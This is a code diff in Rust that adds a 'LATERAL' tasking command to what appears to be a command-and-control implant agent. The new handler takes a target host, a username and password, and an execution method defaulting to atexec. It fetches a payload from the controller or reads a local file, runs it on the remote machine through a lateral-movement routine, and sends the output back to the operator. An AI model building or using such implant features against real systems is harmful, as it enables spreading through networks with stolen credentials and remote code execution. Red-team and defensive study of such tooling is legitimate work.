@@ -1105,6 +1105,26 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, "", "BOF not supported on this platform");
         }
+        "LATERAL" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let method       = j["method"].as_str().unwrap_or("atexec").to_string();
+            let host         = j["host"].as_str().unwrap_or("").to_string();
+            let user         = j["user"].as_str().unwrap_or("").to_string();
+            let pass         = j["pass"].as_str().unwrap_or("").to_string();
+            let cmd          = j["cmd"].as_str().unwrap_or("").to_string();
+            let payload_name = j["payload"].as_str().unwrap_or("").to_string();
+            let data: Vec<u8> = if !payload_name.is_empty() {
+                t.download_file(&payload_name)
+            } else if !cmd.is_empty() {
+                std::fs::read(&cmd).unwrap_or_default()
+            } else {
+                vec![]
+            };
+            match crate::lateral::run_lateral(&method, &host, &data, &cmd, &user, &pass) {
+                Ok(out)  => t.send_result(task.id, &out, ""),
+                Err(err) => t.send_result(task.id, "", &err),
+            }
+        }
         _ => {
             // Delegate to feature modules
             #[cfg(target_os = "windows")]
